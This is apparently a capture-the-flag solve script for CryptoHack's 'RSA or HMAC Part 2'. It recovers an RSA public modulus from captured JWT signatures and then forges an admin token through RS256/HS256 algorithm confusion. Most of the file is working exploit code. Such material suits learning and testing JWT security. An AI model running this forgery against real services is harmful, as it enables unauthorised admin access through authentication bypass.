"""
RSA or HMAC Part 2 (40pts) — JWT key confusion + pubkey recovery

Same RS256/HS256 dual-verification bug as "RSA or HMAC", BUT there is no
/get_pubkey/ endpoint this time. We have to RECOVER the public modulus N
from captured RS256 signatures.

Trick:  for RSA with public exponent e=65537, every signature s on a
message whose EMSA-PKCS1-v1_5(SHA-256) representative is m satisfies

    s^e ≡ m   (mod N)       ⇒   N  |  s^e - m

So given two independent (s_i, m_i) pairs we can do

    N  =  gcd(s_1^e - m_1,  s_2^e - m_2)

after factoring out trivial small primes. Once we have N (and assume the
standard e=65537), we reconstruct a PEM public key, then repeat the
HS256-signed-with-pubkey-bytes trick from "RSA or HMAC".

Steps:
  1. GET /create_session/alice/ and /create_session/bob/  (and /create_session/charlie/ for redundancy)
  2. For each returned JWT, parse header.payload and signature
  3. Compute EMSA-PKCS1-v1_5 padded SHA-256 of each signing_input for
     k = 256 bytes (RSA-2048)  — PyJWT's default. If that fails fall back
     to 384 / 512 / 128 bytes
  4. gcd the resulting differences → recover N
  5. Build an RSA public key PEM string with (N, 65537)
  6. HS256-forge a JWT signed with that PEM as the HMAC secret
  7. Submit to /authorise/

Requires: pycryptodome, requests
"""
import base64
import hashlib
import hmac
import json

import gmpy2
import requests
from Crypto.PublicKey import RSA

BASE = "https://web.cryptohack.org/rsa-or-hmac-2"
E = 65537

# DER-encoded DigestInfo for SHA-256 (RFC 8017, section 9.2)
SHA256_DIGEST_INFO = bytes.fromhex(
    "3031300d060960864801650304020105000420"
)


def b64url_decode(s: str) -> bytes:
    return base64.urlsafe_b64decode(s + "=" * ((4 - len(s) % 4) % 4))


def b64url_encode(b: bytes) -> str:
    return base64.urlsafe_b64encode(b).rstrip(b"=").decode()


def emsa_pkcs1_sha256(signing_input: bytes, k: int) -> bytes:
    """EMSA-PKCS1-v1_5 padded SHA-256 representative, k = modulus length bytes."""
    digest = hashlib.sha256(signing_input).digest()
    T = SHA256_DIGEST_INFO + digest   # 51 bytes
    ps_len = k - len(T) - 3
    if ps_len < 8:
        raise ValueError(f"key size {k} too small for SHA-256 PKCS1")
    return b"\x00\x01" + (b"\xff" * ps_len) + b"\x00" + T


def fetch_session(username: str):
    r = requests.get(f"{BASE}/create_session/{username}/", timeout=15)
    return r.json()["session"]


def parse_jwt(token: str):
    h64, p64, s64 = token.split(".")
    signing_input = f"{h64}.{p64}".encode()
    sig = b64url_decode(s64)
    return signing_input, sig


def recover_modulus(tokens, k_candidates=(256, 384, 512, 128)):
    """Try each likely RSA modulus size and return the first N that
    cleanly divides s^e - m for every token.

    s^e for 2048-bit s and e=65537 is a 134M-bit number. Python's native
    `pow(s, e)` is too slow (Karatsuba), so we use gmpy2 (GMP, which has
    FFT multiplication) for the exponentiation and GCD. A single `s**e`
    computation takes ~10-30 s with gmpy2, vs > 30 min in pure Python.
    """
    pairs = [parse_jwt(t) for t in tokens]
    sig_mpz = [gmpy2.mpz(int.from_bytes(s, "big")) for _, s in pairs]

    for k in k_candidates:
        print(f"[*] Trying RSA modulus size = {k} bytes...")
        try:
            diffs = []
            for i, ((signing_input, _), s) in enumerate(zip(pairs, sig_mpz)):
                m = gmpy2.mpz(int.from_bytes(emsa_pkcs1_sha256(signing_input, k), "big"))
                print(f"    computing s_{i}^e - m_{i} (gmpy2)...", flush=True)
                diff = gmpy2.sub(gmpy2.mpz(s) ** E, m)
                diffs.append(diff)
        except ValueError:
            continue

        print("    gcd across diffs...")
        N = diffs[0]
        for d in diffs[1:]:
            N = gmpy2.gcd(N, d)
        # Strip small factors
        for p in (2, 3, 5, 7, 11, 13):
            while N % p == 0:
                N //= p
        Nint = int(N)
        if Nint > 1 and Nint.bit_length() >= 1024:
            # Verify: for each token, s_int^e mod N == m
            ok = True
            for (signing_input, _), s in zip(pairs, sig_mpz):
                m = int.from_bytes(emsa_pkcs1_sha256(signing_input, k), "big")
                if int(gmpy2.powmod(s, E, N)) != m:
                    ok = False
                    break
            if ok:
                return Nint, k
    raise RuntimeError("Failed to recover N from captured signatures")


def main():
    tokens = [fetch_session(u) for u in ("alice", "bob", "carol")]
    print(f"[1] captured {len(tokens)} RS256 sessions")
    for t in tokens:
        print(f"    {t[:60]}...")

    N, k = recover_modulus(tokens)
    print(f"[2] recovered N ({N.bit_length()} bits), modulus byte length = {k}")

    key = RSA.construct((N, E))
    pub_pem_spki = key.export_key(format="PEM")
    pub_pem_pkcs1 = key.export_key(format="PEM", pkcs=1)

    # Try every reasonable PEM byte variant — the server just uses the raw
    # file bytes as the HMAC secret, so tiny line-ending/newline differences
    # break verification. We enumerate.
    variants = []
    for label, base in (("PKCS1", pub_pem_pkcs1), ("SPKI", pub_pem_spki)):
        base_bytes = base if isinstance(base, bytes) else base.encode()
        # (1) as-is
        variants.append((f"{label}/as-is", base_bytes))
        # (2) + trailing \n
        variants.append((f"{label}/+\\n", base_bytes + b"\n"))
        # (3) strip trailing \n
        variants.append((f"{label}/stripped", base_bytes.rstrip(b"\n")))
        # (4) CRLF
        variants.append((f"{label}/crlf", base_bytes.replace(b"\n", b"\r\n")))
        # (5) CRLF + trailing
        variants.append((f"{label}/crlf+\\n", base_bytes.replace(b"\n", b"\r\n") + b"\r\n"))

    for label, pem_bytes in variants:
        header = {"typ": "JWT", "alg": "HS256"}
        payload = {"username": "admin", "admin": True}
        h = b64url_encode(json.dumps(header, separators=(",", ":")).encode())
        p = b64url_encode(json.dumps(payload, separators=(",", ":")).encode())
        signing_input = f"{h}.{p}".encode()
        sig = hmac.new(pem_bytes, signing_input, hashlib.sha256).digest()
        token = f"{h}.{p}.{b64url_encode(sig)}"
        r = requests.get(f"{BASE}/authorise/{token}/", timeout=15)
        resp = r.json()
        marker = "FLAG" if ("response" in resp and "flag" in resp["response"].lower()) else "    "
        print(f"[{marker}] {label:18s}: {resp}")
        if "response" in resp and "flag" in resp["response"].lower():
            return


if __name__ == "__main__":
    main()
